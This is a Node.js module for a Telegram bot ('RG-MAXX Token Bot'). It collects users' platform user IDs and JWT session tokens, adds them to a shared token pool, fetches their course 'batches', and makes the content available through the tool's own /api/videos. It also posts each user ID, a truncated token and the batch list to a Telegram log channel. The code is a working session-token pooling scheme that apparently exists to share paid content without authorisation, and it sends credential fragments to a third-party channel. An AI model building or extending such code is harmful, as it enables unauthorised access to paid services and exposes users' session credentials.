// lib/telegram.js
// Handles:
//   1. Sending logs to Telegram channel (when user logs in)
//   2. Receiving tokens from Telegram bot (user sends token → added to pool)

import fetch from "node-fetch";
import { addToken } from "./tokenStore.js";
import { fetchUserBatches } from "./fetchBatches.js";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const LOG_CHANNEL = process.env.TELEGRAM_LOG_CHANNEL_ID;

// ─── Send message to log channel ───────────────────────────────────────────
export async function sendLog(text) {
  if (!BOT_TOKEN || !LOG_CHANNEL) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: LOG_CHANNEL,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error("[Telegram] sendLog error:", e.message);
  }
}

// ─── Format login log message ───────────────────────────────────────────────
export function buildLoginLog(userId, token, batches, source = "website") {
  const shortToken = token ? token.substring(0, 35) + "..." : "N/A";
  const batchLines =
    batches.length > 0
      ? batches.map((b) => `  📌 [${b.id}] ${b.name}`).join("\n")
      : "  (no batches found)";

  const sourceEmoji = source === "telegram" ? "🤖 Telegram Bot" : "🌐 Website Login";

  return `
🔐 <b>New User Added to Pool</b>
━━━━━━━━━━━━━━━━━━━━━
📥 Source: <b>${sourceEmoji}</b>
👤 User ID: <code>${userId}</code>
🔑 Token: <code>${shortToken}</code>
📚 Batches (<b>${batches.length}</b>):
${batchLines}
⏰ ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST
━━━━━━━━━━━━━━━━━━━━━`.trim();
}

// ─── Process incoming Telegram message ─────────────────────────────────────
// User sends: /add userId token
// or just: userId token
export async function processTelegramUpdate(update) {
  const msg = update?.message;
  if (!msg) return;

  const chatId = msg.chat.id;
  const text = (msg.text || "").trim();

  // Commands
  if (text === "/start") {
    await sendTelegramReply(chatId, `👋 <b>RG-MAXX Token Bot</b>

Send your userId and token like this:
<code>/add YOUR_USER_ID YOUR_TOKEN</code>

Example:
<code>/add 123456 eyJ0eXAiOiJKV1Q...</code>

Your token will be added to the pool and your batches will be auto-fetched! ✅`);
    return;
  }

  if (text === "/status") {
    const { getTokenCount } = await import("./tokenStore.js");
    await sendTelegramReply(chatId, `📊 Pool Status: <b>${getTokenCount()}</b> tokens active`);
    return;
  }

  // Parse /add userId token  OR  userId token
  let userId, token;

  const addMatch = text.match(/^\/add\s+(\S+)\s+(\S+)/i);
  const plainMatch = text.match(/^(\d+)\s+(eyJ\S+)/);

  if (addMatch) {
    userId = addMatch[1];
    token = addMatch[2];
  } else if (plainMatch) {
    userId = plainMatch[1];
    token = plainMatch[2];
  } else {
    await sendTelegramReply(chatId, `❌ Format samajh nahi aaya.

Sahi format:
<code>/add 123456 eyJ0eXAiOiJKV1Q...</code>`);
    return;
  }

  // Show "processing" message
  await sendTelegramReply(chatId, `⏳ Token verify ho raha hai aur batches fetch ho rahe hain...`);

  // Fetch batches
  let batches = [];
  try {
    batches = await fetchUserBatches(userId, token);
  } catch (e) {
    await sendTelegramReply(chatId, `⚠️ Batches fetch nahi hue lekin token add ho gaya.\nError: ${e.message}`);
  }

  // Add to pool
  addToken(userId, token, "", batches, "telegram");

  // Reply to user
  const batchList =
    batches.length > 0
      ? batches.map((b) => `• [${b.id}] ${b.name}`).join("\n")
      : "(no batches found)";

  await sendTelegramReply(
    chatId,
    `✅ <b>Token Added Successfully!</b>

👤 User ID: <code>${userId}</code>
📚 Batches Found: <b>${batches.length}</b>
${batchList}

Ab aapka content /api/videos etc. se accessible hai! 🎉`
  );

  // Log to channel
  await sendLog(buildLoginLog(userId, token, batches, "telegram"));
}

// ─── Send reply to a specific chat ─────────────────────────────────────────
export async function sendTelegramReply(chatId, text) {
  if (!BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error("[Telegram] reply error:", e.message);
  }
}

// ─── Set webhook ────────────────────────────────────────────────────────────
export async function setWebhook(webhookUrl) {
  if (!BOT_TOKEN) return { ok: false, error: "No BOT_TOKEN set" };
  try {
    const resp = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: webhookUrl }),
      }
    );
    return resp.json();
  } catch (e) {
    return { ok: false, error: e.message };
  }
}
